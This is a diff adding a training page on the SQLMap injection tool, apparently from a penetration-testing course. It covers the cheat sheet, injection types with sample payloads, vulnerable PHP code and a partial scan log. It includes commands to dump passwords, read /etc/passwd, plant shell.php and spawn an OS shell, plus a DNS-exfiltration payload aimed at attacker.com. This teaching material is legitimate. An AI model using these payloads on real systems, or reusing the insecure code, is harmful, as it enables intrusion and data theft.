@@ -1,0 +1,1667 @@
+<html><head></head><body>
+  <div class="container">
+<link rel="stylesheet" href="modules\style.css">
+
+
+<h1 id="16-sqlmap-essentials">16. SQLMap Essentials</h1>
+<h2 id="-cheat-sheet-"><strong>Cheat Sheet</strong></h2>
+<p>The cheat sheet is a useful command reference for this module.</p>
+<table data-header-hidden=""><thead><tr><th width="411"></th><th></th></tr></thead><tbody><tr><td><strong>Command</strong></td><td><strong>Description</strong></td></tr><tr><td><code>sqlmap -h</code></td><td>View the basic help menu</td></tr><tr><td><code>sqlmap -hh</code></td><td>View the advanced help menu</td></tr><tr><td><code>sqlmap -u "<a href="http://www.example.com/vuln.php?id=1">http://www.example.com/vuln.php?id=1</a>" --batch</code></td><td>Run <code>SQLMap</code> without asking for user input</td></tr><tr><td><code>sqlmap '<a href="http://www.example.com/">http://www.example.com/</a>' --data 'uid=1&amp;name=test'</code></td><td><code>SQLMap</code> with POST request</td></tr><tr><td><code>sqlmap '<a href="http://www.example.com/">http://www.example.com/</a>' --data 'uid=1*&amp;name=test'</code></td><td>POST request specifying an injection point with an asterisk</td></tr><tr><td><code>sqlmap -r req.txt</code></td><td>Passing an HTTP request file to <code>SQLMap</code></td></tr><tr><td><code>sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'</code></td><td>Specifying a cookie header</td></tr><tr><td><code>sqlmap -u www.target.com --data='id=1' --method PUT</code></td><td>Specifying a PUT request</td></tr><tr><td><code>sqlmap -u "<a href="http://www.target.com/vuln.php?id=1">http://www.target.com/vuln.php?id=1</a>" --batch -t /tmp/traffic.txt</code></td><td>Store traffic to an output file</td></tr><tr><td><code>sqlmap -u "<a href="http://www.target.com/vuln.php?id=1">http://www.target.com/vuln.php?id=1</a>" -v 6 --batch</code></td><td>Specify verbosity level</td></tr><tr><td><code>sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"</code></td><td>Specifying a prefix or suffix</td></tr><tr><td><code>sqlmap -u www.example.com/?id=1 -v 3 --level=5</code></td><td>Specifying the level and risk</td></tr><tr><td><code>sqlmap -u "<a href="http://www.example.com/?id=1">http://www.example.com/?id=1</a>" --banner --current-user --current-db --is-dba</code></td><td>Basic DB enumeration</td></tr><tr><td><code>sqlmap -u "<a href="http://www.example.com/?id=1">http://www.example.com/?id=1</a>" --tables -D testdb</code></td><td>Table enumeration</td></tr><tr><td><code>sqlmap -u "<a href="http://www.example.com/?id=1">http://www.example.com/?id=1</a>" --dump -T users -D testdb -C name,surname</code></td><td>Table/row enumeration</td></tr><tr><td><code>sqlmap -u "<a href="http://www.example.com/?id=1">http://www.example.com/?id=1</a>" --dump -T users -D testdb --where="name LIKE 'f%'"</code></td><td>Conditional enumeration</td></tr><tr><td><code>sqlmap -u "<a href="http://www.example.com/?id=1">http://www.example.com/?id=1</a>" --schema</code></td><td>Database schema enumeration</td></tr><tr><td><code>sqlmap -u "<a href="http://www.example.com/?id=1">http://www.example.com/?id=1</a>" --search -T user</code></td><td>Searching for data</td></tr><tr><td><code>sqlmap -u "<a href="http://www.example.com/?id=1">http://www.example.com/?id=1</a>" --passwords --batch</code></td><td>Password enumeration and cracking</td></tr><tr><td><code>sqlmap -u "<a href="http://www.example.com/">http://www.example.com/</a>" --data="id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"</code></td><td>Anti-CSRF token bypass</td></tr><tr><td><code>sqlmap --list-tampers</code></td><td>List all tamper scripts</td></tr><tr><td><code>sqlmap -u "<a href="http://www.example.com/case1.php?id=1">http://www.example.com/case1.php?id=1</a>" --is-dba</code></td><td>Check for DBA privileges</td></tr><tr><td><code>sqlmap -u "<a href="http://www.example.com/?id=1">http://www.example.com/?id=1</a>" --file-read "/etc/passwd"</code></td><td>Reading a local file</td></tr><tr><td><code>sqlmap -u "<a href="http://www.example.com/?id=1">http://www.example.com/?id=1</a>" --file-write "shell.php" --file-dest "/var/www/html/shell.php"</code></td><td>Writing a file</td></tr><tr><td><code>sqlmap -u "<a href="http://www.example.com/?id=1">http://www.example.com/?id=1</a>" --os-shell</code></td><td>Spawning an OS shell</td></tr></tbody></table>
+
+<h2 id="sqlmap-overview">SQLMap Overview</h2>
+<hr>
+<p><a href="https://github.com/sqlmapproject/sqlmap">SQLMap</a> is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws. SQLMap has been continuously developed since 2006 and is still maintained today.</p>
+<p>SQLMap Overview</p>
+<pre><code class="lang-shell-session">root@htb<span class="hljs-comment">[/htb]</span>$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
+
+       ___
+       __H__
+ ___ ___<span class="hljs-comment">[']</span>_____ ___ ___  {1.3.10.41#dev}
+|_ -| . <span class="hljs-comment">[']</span>     | .'| . |
+|___|_  <span class="hljs-comment">["]</span>_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+<span class="hljs-comment">[!]</span> legal disclaimer: Usage <span class="hljs-keyword">of</span> sqlmap for attacking targets without prior mutual consent <span class="hljs-keyword">is</span> illegal. It <span class="hljs-keyword">is</span> the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and <span class="hljs-keyword">are</span> not responsible for any misuse or damage caused by this program
+
+<span class="hljs-comment">[*]</span> starting at 12:55:56
+
+<span class="hljs-comment">[12:55:56]</span> <span class="hljs-comment">[INFO]</span> testing connection to the target URL
+<span class="hljs-comment">[12:55:57]</span> <span class="hljs-comment">[INFO]</span> checking if the target <span class="hljs-keyword">is</span> protected by some <span class="hljs-keyword">kind</span> <span class="hljs-keyword">of</span> WAF/IPS/IDS
+<span class="hljs-comment">[12:55:58]</span> <span class="hljs-comment">[INFO]</span> testing if the target URL content <span class="hljs-keyword">is</span> stable
+<span class="hljs-comment">[12:55:58]</span> <span class="hljs-comment">[INFO]</span> target URL content <span class="hljs-keyword">is</span> stable
+<span class="hljs-comment">[12:55:58]</span> <span class="hljs-comment">[INFO]</span> testing if GET parameter 'id' <span class="hljs-keyword">is</span> dynamic
+<span class="hljs-comment">[12:55:58]</span> <span class="hljs-comment">[INFO]</span> confirming that GET parameter 'id' <span class="hljs-keyword">is</span> dynamic
+<span class="hljs-comment">[12:55:59]</span> <span class="hljs-comment">[INFO]</span> GET parameter 'id' <span class="hljs-keyword">is</span> dynamic
+<span class="hljs-comment">[12:55:59]</span> <span class="hljs-comment">[INFO]</span> heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+<span class="hljs-comment">[12:56:00]</span> <span class="hljs-comment">[INFO]</span> testing for SQL injection on GET parameter 'id'
+&lt;...SNIP...&gt;
+</code></pre>
+<p>SQLMap comes with a powerful detection engine, numerous features, and a broad range of options and switches for fine-tuning the many aspects of it, such as:</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Target connection</td>
+<td>Injection detection</td>
+<td>Fingerprinting</td>
+</tr>
+<tr>
+<td>Enumeration</td>
+<td>Optimization</td>
+<td>Protection detection and bypass using "tamper" scripts</td>
+</tr>
+<tr>
+<td>Database content retrieval</td>
+<td>File system access</td>
+<td>Execution of the operating system (OS) commands</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="sqlmap-installation">SQLMap Installation</h3>
+<p>SQLMap is pre-installed on your Pwnbox, and the majority of security-focused operating systems. SQLMap is also found on many Linux Distributions' libraries. For example, on Debian, it can be installed with:</p>
+<p>SQLMap Overview</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo apt install sqlmap
+</code></pre>
+<p>If we want to install manually, we can use the following command in the Linux terminal or the Windows command line:</p>
+<p>SQLMap Overview</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ git <span class="hljs-keyword">clone</span> <span class="hljs-title">--depth</span> <span class="hljs-number">1</span> https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+</code></pre>
+<p>After that, SQLMap can be run with:</p>
+<p>SQLMap Overview</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ python sqlmap.py
+</code></pre>
+<hr>
+<h3 id="supported-databases">Supported Databases</h3>
+<p>SQLMap has the largest support for DBMSes of any other SQL exploitation tool. SQLMap fully supports the following DBMSes:</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>MySQL</code></td>
+<td><code>Oracle</code></td>
+<td><code>PostgreSQL</code></td>
+<td><code>Microsoft SQL Server</code></td>
+</tr>
+<tr>
+<td><code>SQLite</code></td>
+<td><code>IBM DB2</code></td>
+<td><code>Microsoft Access</code></td>
+<td><code>Firebird</code></td>
+</tr>
+<tr>
+<td><code>Sybase</code></td>
+<td><code>SAP MaxDB</code></td>
+<td><code>Informix</code></td>
+<td><code>MariaDB</code></td>
+</tr>
+<tr>
+<td><code>HSQLDB</code></td>
+<td><code>CockroachDB</code></td>
+<td><code>TiDB</code></td>
+<td><code>MemSQL</code></td>
+</tr>
+<tr>
+<td><code>H2</code></td>
+<td><code>MonetDB</code></td>
+<td><code>Apache Derby</code></td>
+<td><code>Amazon Redshift</code></td>
+</tr>
+<tr>
+<td><code>Vertica</code>, <code>Mckoi</code></td>
+<td><code>Presto</code></td>
+<td><code>Altibase</code></td>
+<td><code>MimerSQL</code></td>
+</tr>
+<tr>
+<td><code>CrateDB</code></td>
+<td><code>Greenplum</code></td>
+<td><code>Drizzle</code></td>
+<td><code>Apache Ignite</code></td>
+</tr>
+<tr>
+<td><code>Cubrid</code></td>
+<td><code>InterSystems Cache</code></td>
+<td><code>IRIS</code></td>
+<td><code>eXtremeDB</code></td>
+</tr>
+<tr>
+<td><code>FrontBase</code></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>The SQLMap team also works to add and support new DBMSes periodically.</p>
+<hr>
+<h3 id="supported-sql-injection-types">Supported SQL Injection Types</h3>
+<p>SQLMap is the only penetration testing tool that can properly detect and exploit all known SQLi types. We see the types of SQL injections supported by SQLMap with the <code>sqlmap -hh</code> command:</p>
+<p>SQLMap Overview</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sqlmap -hh
+...SNIP...
+  Techniques:
+    --technique=TECH..  SQL injection techniques to use (<span class="hljs-keyword">default</span> <span class="hljs-string">"BEUSTQ"</span>)
+</code></pre>
+<p>The technique characters <code>BEUSTQ</code> refers to the following:</p>
+<ul>
+<li><code>B</code>: Boolean-based blind</li>
+<li><code>E</code>: Error-based</li>
+<li><code>U</code>: Union query-based</li>
+<li><code>S</code>: Stacked queries</li>
+<li><code>T</code>: Time-based blind</li>
+<li><code>Q</code>: Inline queries</li>
+</ul>
+<hr>
+<h3 id="boolean-based-blind-sql-injection">Boolean-based blind SQL Injection</h3>
+<p>Example of <code>Boolean-based blind SQL Injection</code>:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">AND <span class="hljs-number">1</span>=<span class="hljs-number">1</span>
+</code></pre>
+<p>SQLMap exploits <code>Boolean-based blind SQL Injection</code> vulnerabilities through the differentiation of <code>TRUE</code> from <code>FALSE</code> query results, effectively retrieving 1 byte of information per request. The differentiation is based on comparing server responses to determine whether the SQL query returned <code>TRUE</code> or <code>FALSE</code>. This ranges from fuzzy comparisons of raw response content, HTTP codes, page titles, filtered text, and other factors.</p>
+<ul>
+<li><code>TRUE</code> results are generally based on responses having none or marginal difference to the regular server response.</li>
+<li><code>FALSE</code> results are based on responses having substantial differences from the regular server response.</li>
+<li><code>Boolean-based blind SQL Injection</code> is considered as the most common SQLi type in web applications.</li>
+</ul>
+<hr>
+<h3 id="error-based-sql-injection">Error-based SQL Injection</h3>
+<p>Example of <code>Error-based SQL Injection</code>:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-selector-tag">AND</span> <span class="hljs-selector-tag">GTID_SUBSET</span>(<span class="hljs-variable">@@version</span>,<span class="hljs-number">0</span>)
+</code></pre>
+<p>If the <code>database management system</code> (<code>DBMS</code>) errors are being returned as part of the server response for any database-related problems, then there is a probability that they can be used to carry the results for requested queries. In such cases, specialized payloads for the current DBMS are used, targeting the functions that cause known misbehaviors. SQLMap has the most comprehensive list of such related payloads and covers <code>Error-based SQL Injection</code> for the following DBMSes:</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MySQL</td>
+<td>PostgreSQL</td>
+<td>Oracle</td>
+</tr>
+<tr>
+<td>Microsoft SQL Server</td>
+<td>Sybase</td>
+<td>Vertica</td>
+</tr>
+<tr>
+<td>IBM DB2</td>
+<td>Firebird</td>
+<td>MonetDB</td>
+</tr>
+</tbody>
+</table>
+<p>Error-based SQLi is considered as faster than all other types, except UNION query-based, because it can retrieve a limited amount (e.g., 200 bytes) of data called "chunks" through each request.</p>
+<hr>
+<h3 id="union-query-based">UNION query-based</h3>
+<p>Example of <code>UNION query-based SQL Injection</code>:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-built_in">UNION</span> ALL <span class="hljs-built_in">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-comment">@@</span>version,<span class="hljs-number">3</span>
+</code></pre>
+<p>With the usage of <code>UNION</code>, it is generally possible to extend the original (<code>vulnerable</code>) query with the injected statements' results. This way, if the original query results are rendered as part of the response, the attacker can get additional results from the injected statements within the page response itself. This type of SQL injection is considered the fastest, as, in the ideal scenario, the attacker would be able to pull the content of the whole database table of interest with a single request.</p>
+<hr>
+<h3 id="stacked-queries">Stacked queries</h3>
+<p>Example of <code>Stacked Queries</code>:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">; <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">users</span>
+</code></pre>
+<p>Stacking SQL queries, also known as the "piggy-backing," is the form of injecting additional SQL statements after the vulnerable one. In case that there is a requirement for running non-query statements (e.g. <code>INSERT</code>, <code>UPDATE</code> or <code>DELETE</code>), stacking must be supported by the vulnerable platform (e.g., <code>Microsoft SQL Server</code> and <code>PostgreSQL</code> support it by default). SQLMap can use such vulnerabilities to run non-query statements executed in advanced features (e.g., execution of OS commands) and data retrieval similarly to time-based blind SQLi types.</p>
+<hr>
+<h3 id="time-based-blind-sql-injection">Time-based blind SQL Injection</h3>
+<p>Example of <code>Time-based blind SQL Injection</code>:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">AND <span class="hljs-number">1</span>=IF(<span class="hljs-number">2</span>&gt;<span class="hljs-number">1</span>,SLEEP(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>)
+</code></pre>
+<p>The principle of <code>Time-based blind SQL Injection</code> is similar to the <code>Boolean-based blind SQL Injection</code>, but here the response time is used as the source for the differentiation between <code>TRUE</code> or <code>FALSE</code>.</p>
+<ul>
+<li><code>TRUE</code> response is generally characterized by the noticeable difference in the response time compared to the regular server response</li>
+<li><code>FALSE</code> response should result in a response time indistinguishable from regular response times</li>
+</ul>
+<p><code>Time-based blind SQL Injection</code> is considerably slower than the boolean-based blind SQLi, since queries resulting in <code>TRUE</code> would delay the server response. This SQLi type is used in cases where <code>Boolean-based blind SQL Injection</code> is not applicable. For example, in case the vulnerable SQL statement is a non-query (e.g. <code>INSERT</code>, <code>UPDATE</code> or <code>DELETE</code>), executed as part of the auxiliary functionality without any effect to the page rendering process, time-based SQLi is used out of the necessity, as <code>Boolean-based blind SQL Injection</code> would not really work in this case.</p>
+<hr>
+<h3 id="inline-queries">Inline queries</h3>
+<p>Example of <code>Inline Queries</code>:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-selector-tag">SELECT</span> (SELECT <span class="hljs-variable">@@version</span>) <span class="hljs-selector-tag">from</span>
+</code></pre>
+<p>This type of injection embedded a query within the original query. Such SQL injection is uncommon, as it needs the vulnerable web app to be written in a certain way. Still, SQLMap supports this kind of SQLi as well.</p>
+<hr>
+<h3 id="out-of-band-sql-injection">Out-of-band SQL Injection</h3>
+<p>Example of <code>Out-of-band SQL Injection</code>:</p>
+<pre><code class="lang-sql"><span class="hljs-selector-tag">LOAD_FILE</span>(CONCAT(<span class="hljs-string">'\\\\'</span>,<span class="hljs-variable">@@version</span>,<span class="hljs-string">'.attacker.com\\README.txt'</span>))
+</code></pre>
+<p>This is considered one of the most advanced types of SQLi, used in cases where all other types are either unsupported by the vulnerable web application or are too slow (e.g., time-based blind SQLi). SQLMap supports out-of-band SQLi through "DNS exfiltration," where requested queries are retrieved through DNS traffic.</p>
+<p>By running the SQLMap on the DNS server for the domain under control (e.g. <code>.attacker.com</code>), SQLMap can perform the attack by forcing the server to request non-existent subdomains (e.g. <code>foo.attacker.com</code>), where <code>foo</code> would be the SQL response we want to receive. SQLMap can then collect these erroring DNS requests and collect the <code>foo</code> part, to form the entire SQL response.</p>
+<h2 id="getting-started-with-sqlmap">Getting Started with SQLMap</h2>
+<hr>
+<p>Upon starting using SQLMap, the first stop for new users is usually the program's help message. To help new users, there are two levels of help message listing:</p>
+<ul>
+<li><code>Basic Listing</code> shows only the basic options and switches, sufficient in most cases (switch <code>-h</code>):</li>
+</ul>
+<pre><code class="lang-shell-session">[!bash!]$ sqlmap -h
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {<span class="hljs-number">1.4</span><span class="hljs-number">.9</span>#stable}
+|<span class="hljs-type">_</span> -| <span class="hljs-type">. ["]     | .'| . |
+|___</span>|<span class="hljs-type">_</span>  [.]<span class="hljs-keyword">_</span>|<span class="hljs-type">_</span>|<span class="hljs-type">_</span>|<span class="hljs-type">__</span>,|  <span class="hljs-type">_</span>|
+      <span class="hljs-type">|_</span>|<span class="hljs-type">V</span>...       |<span class="hljs-type">_</span>|   <span class="hljs-type">http</span>://sqlmap.org
+
+Usage: python3 sqlmap [options]
+
+<span class="hljs-keyword">Options</span>:
+  -h, --help            <span class="hljs-keyword">Show</span> basic help message and exit
+  -hh                   <span class="hljs-keyword">Show</span> advanced help message and exit
+  --version             <span class="hljs-keyword">Show</span> program's version number and exit
+  -v VERBOSE            Verbosity level: <span class="hljs-number">0</span><span class="hljs-number">-6</span> (default <span class="hljs-number">1</span>)
+
+  Target:
+    At least one of these options has to be provided to define the
+    target(s)
+
+    -u URL, --url=URL   Target URL (e.g. <span class="hljs-string">"http://www.site.com/vuln.php?id=1"</span>)
+    -g GOOGLEDORK       Process Google dork results <span class="hljs-built_in">as</span> target URLs
+...SNIP...
+</code></pre>
+<ul>
+<li><code>Advanced Listing</code> shows all options and switches (switch <code>-hh</code>):</li>
+</ul>
+<pre><code class="lang-shell-session">[!bash!]$ sqlmap -hh
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.4.9#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+Usage: python3 sqlmap [options]
+
+Options:
+  -<span class="ruby">h, --help            Show basic help message <span class="hljs-keyword">and</span> exit
+</span>  -<span class="ruby">hh                   Show advanced help message <span class="hljs-keyword">and</span> exit
+</span>  -<span class="ruby">-version             Show program<span class="hljs-string">'s version number and exit
+</span></span>  -<span class="ruby"><span class="hljs-string">v VERBOSE            Verbosity level: 0-6 (default 1)
+</span></span>
+  Target:
+    At least one of these options has to be provided to define the
+    target(s)
+
+    -<span class="ruby"><span class="hljs-string">u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
+</span></span>    -<span class="ruby"><span class="hljs-string">d DIRECT           Connection string for direct database connection
+</span></span>    -<span class="ruby"><span class="hljs-string">l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
+</span></span>    -<span class="ruby"><span class="hljs-string">m BULKFILE         Scan multiple targets given in a textual file
+</span></span>    -<span class="ruby"><span class="hljs-string">r REQUESTFILE      Load HTTP request from a file
+</span></span>    -<span class="ruby"><span class="hljs-string">g GOOGLEDORK       Process Google dork results as target URLs
+</span></span>    -<span class="ruby"><span class="hljs-string">c CONFIGFILE       Load options from a configuration INI file
+</span></span>
+  Request:
+    These options can be used to specify how to connect to the target URL
+
+    -<span class="ruby"><span class="hljs-string">A AGENT, --user..  HTTP User-Agent header value
+</span></span>    -<span class="ruby"><span class="hljs-string">H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
+</span></span>    -<span class="ruby"><span class="hljs-string">-method=METHOD     Force usage of given HTTP method (e.g. PUT)
+</span></span>    -<span class="ruby"><span class="hljs-string">-data=DATA         Data string to be sent through POST (e.g. "id=1")
+</span></span>    -<span class="ruby"><span class="hljs-string">-param-del=PARA..  Character used for splitting parameter values (e.g. &amp;)
+</span></span>    -<span class="ruby"><span class="hljs-string">-cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
+</span></span>    -<span class="ruby"><span class="hljs-string">-cookie-del=COO..  Character used for splitting cookie values (e.g. ;)
+</span></span>...SNIP...
+</code></pre>
+<p>For more details, users are advised to consult the project's <a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">wiki</a>, as it represents the official manual for SQLMap's usage.</p>
+<hr>
+<h3 id="basic-scenario">Basic Scenario</h3>
+<p>In a simple scenario, a penetration tester accesses the web page that accepts user input via a <code>GET</code> parameter (e.g., <code>id</code>). They then want to test if the web page is affected by the SQL injection vulnerability. If so, they would want to exploit it, retrieve as much information as possible from the back-end database, or even try to access the underlying file system and execute OS commands. An example SQLi vulnerable PHP code for this scenario would look as follows:</p>
+<pre><code class="lang-php">$link = mysqli_connect($host, $username, $password, $database, <span class="hljs-number">3306</span>);
+$sql = <span class="hljs-string">"SELECT * FROM users WHERE id = "</span> . $_GET[<span class="hljs-string">"id"</span>] . <span class="hljs-string">" LIMIT 0, 1"</span>;
+$result = mysqli_query($link, $sql);
+<span class="hljs-keyword">if</span> (!$result)
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">"&lt;b&gt;SQL error:&lt;/b&gt; "</span>. mysqli_error($link) . <span class="hljs-string">"&lt;br&gt;\n"</span>);
+</code></pre>
+<p>As error reporting is enabled for the vulnerable SQL query, there will be a database error returned as part of the web-server response in case of any SQL query execution problems. Such cases ease the process of SQLi detection, especially in case of manual parameter value tampering, as the resulting errors are easily recognized:</p>
+<p><img src="storage\modules\58\rOrm8tC.png" alt=""></p>
+<p>To run SQLMap against this example, located at the example URL <code>http://www.example.com/vuln.php?id=1</code>, would look like the following:</p>
+<pre><code class="lang-shell-session">[<span class="hljs-name">!bash!</span>]$ sqlmap -u <span class="hljs-string">"http://www.example.com/vuln.php?id=1"</span> --batch
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {<span class="hljs-number">1.4</span>.9}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] starting @ <span class="hljs-number">22</span>:26:45 /2020-09-09/
+
+[<span class="hljs-name">22:26:45</span>] [<span class="hljs-name">INFO</span>] testing connection to the target URL
+[<span class="hljs-name">22:26:45</span>] [<span class="hljs-name">INFO</span>] testing if the target URL content is stable
+[<span class="hljs-name">22:26:46</span>] [<span class="hljs-name">INFO</span>] target URL content is stable
+[<span class="hljs-name">22:26:46</span>] [<span class="hljs-name">INFO</span>] testing if GET parameter <span class="hljs-symbol">'id</span>' is dynamic
+[<span class="hljs-name">22:26:46</span>] [<span class="hljs-name">INFO</span>] GET parameter <span class="hljs-symbol">'id</span>' appears to be dynamic
+[<span class="hljs-name">22:26:46</span>] [<span class="hljs-name">INFO</span>] heuristic (<span class="hljs-name">basic</span>) test shows that GET parameter <span class="hljs-symbol">'id</span>' might be injectable (<span class="hljs-name">possible</span> DBMS: <span class="hljs-symbol">'MySQL</span>')
+[<span class="hljs-name">22:26:46</span>] [<span class="hljs-name">INFO</span>] heuristic (<span class="hljs-name">XSS</span>) test shows that GET parameter <span class="hljs-symbol">'id</span>' might be vulnerable to cross-site scripting (<span class="hljs-name">XSS</span>) attacks
+[<span class="hljs-name">22:26:46</span>] [<span class="hljs-name">INFO</span>] testing for SQL injection on GET parameter <span class="hljs-symbol">'id</span>'
+it looks like the back-end DBMS is <span class="hljs-symbol">'MySQL</span><span class="hljs-symbol">'.</span> Do you want to skip test payloads specific for other DBMSes? [<span class="hljs-name">Y/n</span>] Y
+for the remaining tests, do you want to include all tests for <span class="hljs-symbol">'MySQL</span>' extending provided level (<span class="hljs-name">1</span>) and risk (<span class="hljs-name">1</span>) values? [<span class="hljs-name">Y/n</span>] Y
+[<span class="hljs-name">22:26:46</span>] [<span class="hljs-name">INFO</span>] testing <span class="hljs-symbol">'AND</span> boolean-based blind - WHERE or HAVING clause'
+[<span class="hljs-name">22:26:46</span>] [<span class="hljs-name">WARNING</span>] reflective value(<span class="hljs-name">s</span>) found and filtering out
+[<span class="hljs-name">22:26:46</span>] [<span class="hljs-name">INFO</span>] GET parameter <span class="hljs-symbol">'id</span>' appears to be <span class="hljs-symbol">'AND</span> boolean-based blind - WHERE or HAVING clause' injectable (<span class="hljs-name">with</span> --string=<span class="hljs-string">"luther"</span>)
+[<span class="hljs-name">22:26:46</span>] [<span class="hljs-name">INFO</span>] testing <span class="hljs-symbol">'Generic</span> inline queries'
+[<span class="hljs-name">22:26:46</span>] [<span class="hljs-name">INFO</span>] testing <span class="hljs-symbol">'MySQL</span> &gt;= <span class="hljs-number">5.5</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (<span class="hljs-name">BIGINT</span> UNSIGNED)'
+[<span class="hljs-name">22:26:46</span>] [<span class="hljs-name">INFO</span>] testing <span class="hljs-symbol">'MySQL</span> &gt;= <span class="hljs-number">5.5</span> OR error-based - WHERE or HAVING clause (<span class="hljs-name">BIGINT</span> UNSIGNED)'
+...SNIP...
+[<span class="hljs-name">22:26:46</span>] [<span class="hljs-name">INFO</span>] GET parameter <span class="hljs-symbol">'id</span>' is <span class="hljs-symbol">'MySQL</span> &gt;= <span class="hljs-number">5.0</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (<span class="hljs-name">FLOOR</span>)' injectable 
+[<span class="hljs-name">22:26:46</span>] [<span class="hljs-name">INFO</span>] testing <span class="hljs-symbol">'MySQL</span> inline queries'
+[<span class="hljs-name">22:26:46</span>] [<span class="hljs-name">INFO</span>] testing <span class="hljs-symbol">'MySQL</span> &gt;= <span class="hljs-number">5.0</span>.12 stacked queries (<span class="hljs-name">comment</span>)'
+[<span class="hljs-name">22:26:46</span>] [<span class="hljs-name">WARNING</span>] time-based comparison requires larger statistical model, please wait........... (<span class="hljs-name">done</span>)                                                                                                       
+...SNIP...
+[<span class="hljs-name">22:26:46</span>] [<span class="hljs-name">INFO</span>] testing <span class="hljs-symbol">'MySQL</span> &gt;= <span class="hljs-number">5.0</span>.12 AND time-based blind (<span class="hljs-name">query</span> SLEEP)'
+[<span class="hljs-name">22:26:56</span>] [<span class="hljs-name">INFO</span>] GET parameter <span class="hljs-symbol">'id</span>' appears to be <span class="hljs-symbol">'MySQL</span> &gt;= <span class="hljs-number">5.0</span>.12 AND time-based blind (<span class="hljs-name">query</span> SLEEP)' injectable 
+[<span class="hljs-name">22:26:56</span>] [<span class="hljs-name">INFO</span>] testing <span class="hljs-symbol">'Generic</span> UNION query (<span class="hljs-name">NULL</span>) - <span class="hljs-number">1</span> to <span class="hljs-number">20</span> columns'
+[<span class="hljs-name">22:26:56</span>] [<span class="hljs-name">INFO</span>] automatically extending ranges for UNION query injection technique tests as there is at least one other (<span class="hljs-name">potential</span>) technique found
+[<span class="hljs-name">22:26:56</span>] [<span class="hljs-name">INFO</span>] <span class="hljs-symbol">'ORDER</span> BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[<span class="hljs-name">22:26:56</span>] [<span class="hljs-name">INFO</span>] target URL appears to have <span class="hljs-number">3</span> columns in query
+[<span class="hljs-name">22:26:56</span>] [<span class="hljs-name">INFO</span>] GET parameter <span class="hljs-symbol">'id</span>' is <span class="hljs-symbol">'Generic</span> UNION query (<span class="hljs-name">NULL</span>) - <span class="hljs-number">1</span> to <span class="hljs-number">20</span> columns' injectable
+GET parameter <span class="hljs-symbol">'id</span>' is vulnerable. Do you want to keep testing the others (<span class="hljs-name"><span class="hljs-builtin-name">if</span></span> any)? [<span class="hljs-name">y/N</span>] N
+sqlmap identified the following injection point(<span class="hljs-name">s</span>) with a total of <span class="hljs-number">46</span> HTTP(<span class="hljs-name">s</span>) requests:
+---
+Parameter: id (<span class="hljs-name">GET</span>)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND <span class="hljs-number">8814</span>=8814
+
+    Type: error-based
+    Title: MySQL &gt;= <span class="hljs-number">5.0</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (<span class="hljs-name">FLOOR</span>)
